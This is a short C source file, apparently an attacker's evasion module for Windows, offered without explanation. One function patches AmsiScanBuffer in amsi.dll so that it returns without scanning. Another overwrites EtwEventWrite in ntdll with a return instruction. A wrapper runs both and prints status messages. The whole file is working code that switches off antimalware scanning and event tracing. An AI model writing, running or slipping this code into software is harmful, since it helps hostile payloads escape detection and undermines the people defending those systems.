#include <windows.h>
#include <stdio.h>

void unhook_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;

    void *amsiScanBuf = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsiScanBuf) return;

    DWORD oldProtect;
    VirtualProtect(amsiScanBuf, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
    unsigned char patch[] = { 0x48, 0x31, 0xC0, 0xC3 };
    memcpy(amsiScanBuf, patch, sizeof(patch));
    VirtualProtect(amsiScanBuf, 6, oldProtect, &oldProtect);
    printf("[*] AMSI unhooked\n");
}

void unhook_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;

    void *etwEventWrite = GetProcAddress(ntdll, "EtwEventWrite");
    if (!etwEventWrite) return;

    DWORD oldProtect;
    VirtualProtect(etwEventWrite, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
    unsigned char patch[] = { 0xC3 };
    memcpy(etwEventWrite, patch, sizeof(patch));
    VirtualProtect(etwEventWrite, 6, oldProtect, &oldProtect);
    printf("[*] ETW unhooked\n");
}

void unhook_security() {
    unhook_amsi();
    unhook_etw();
}